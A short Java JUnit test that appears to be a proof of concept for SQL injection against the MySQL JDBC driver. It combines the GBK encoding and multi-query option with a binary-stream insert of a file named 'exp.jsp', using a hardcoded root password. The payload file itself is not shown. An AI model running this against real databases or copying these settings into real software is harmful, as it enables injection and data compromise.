package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;

public class Poc {
    @Test
    public void sqli() throws SQLException, IOException {
        String url =
                "jdbc:mysql://127.0.0.1:3306/db?user=root&password=trgadna&useUnicode=true&characterEncoding=gbk&allowMultiQueries=true";
        Connection conn = DriverManager.getConnection(url);

        PreparedStatement ps = conn.prepareStatement("INSERT INTO t1 (size, data) VALUES (?, ?)");
        File file = new File("exp.jsp");
        FileInputStream fis = new FileInputStream(file);
        ps.setInt(1, (int) file.length());
        ps.setBinaryStream(2, fis);
        ps.execute();
        fis.close();
    }
}
